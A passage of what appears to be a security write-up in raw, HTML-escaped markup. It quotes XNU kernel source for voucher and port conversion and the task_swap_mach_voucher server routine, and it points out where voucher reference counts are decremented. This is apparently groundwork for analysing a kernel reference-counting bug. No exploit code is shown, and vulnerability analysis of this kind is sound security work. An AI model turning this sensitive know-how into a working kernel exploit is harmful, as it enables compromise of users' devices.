    393:  *		Caller has a send-right reference to port.
    394:  *		Port may or may not be locked.
    395:  */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;396&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_voucher_t&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;397&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;convert_port_to_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;398&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;ipc_port_t&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;399&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP_VALID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;401&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;ipc_voucher_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_voucher_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_kobject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;402&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;403&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;cm&quot;&gt;/*
    404: 		 * No need to lock because we have a reference on the
    405: 		 * port, and if it is a true voucher port, that reference
    406: 		 * keeps the voucher bound to the port (and active).
    407: 		 */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;408&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_kotype&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_VOUCHER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;409&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IV_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;410&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;411&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_active&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;412&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;413&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;ipc_voucher_reference&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;414&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;415&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;416&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IV_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;417&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;418&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The function &lt;strong&gt;convert_voucher_to_port&lt;/strong&gt; will decrease the reference count by calling &lt;strong&gt;ipc_voucher_release&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;osfmk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;492&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/*
    493:  * Convert a voucher to a port.
    494:  */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;495&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port_t&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;496&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;convert_voucher_to_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_voucher_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;497&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;498&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;ipc_port_t&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;499&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;500&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IV_NULL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;501&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;502&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;503&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os_ref_get_count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iv_refs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;504&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;505&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;cm&quot;&gt;/* create a port if needed */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;506&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iv_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;507&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP_VALID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;508&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port_alloc_kernel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;509&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP_VALID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;510&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;ipc_kobject_set_atomically&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_kobject_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_VOUCHER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;511&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;512&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;cm&quot;&gt;/* If we lose the race, deallocate and pick up the other guy's port */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;513&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OSCompareAndSwapPtr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iv_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;514&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;n&quot;&gt;ipc_port_dealloc_kernel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;515&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iv_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;516&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;n&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_kotype&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_VOUCHER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;517&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;n&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_kobject&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_kobject_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;518&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;519&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;520&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	
    &lt;span class=&quot;mi&quot;&gt;521&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;ip_lock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;522&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_active&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;523&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port_make_send_locked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;524&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;525&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_srights&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;526&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;ipc_port_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;old_notify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;527&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;528&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;cm&quot;&gt;/* transfer our ref to the port, and arm the no-senders notification */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;529&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP_NULL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_nsrequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;530&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;ipc_port_nsrequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_mscount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port_make_sonce_locked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;old_notify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;531&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;cm&quot;&gt;/* port unlocked */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;532&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP_NULL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;old_notify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;533&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;534&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;cm&quot;&gt;/* piggyback on the existing port reference, so consume ours */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;535&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;ip_unlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;536&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;ipc_voucher_release&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;537&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;538&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;539&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;540&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And within the routine &lt;strong&gt;task_swap_mach_voucher&lt;/strong&gt;, the reference count of new voucher is descreased by one by calling &lt;strong&gt;ipc_voucher_release&lt;/strong&gt; (Line 4844).&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BUILD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RELEASE_X86_64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;osfmk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RELEASE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task_server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4836&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;4837&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;convert_port_to_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;In0P&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_request_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4838&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
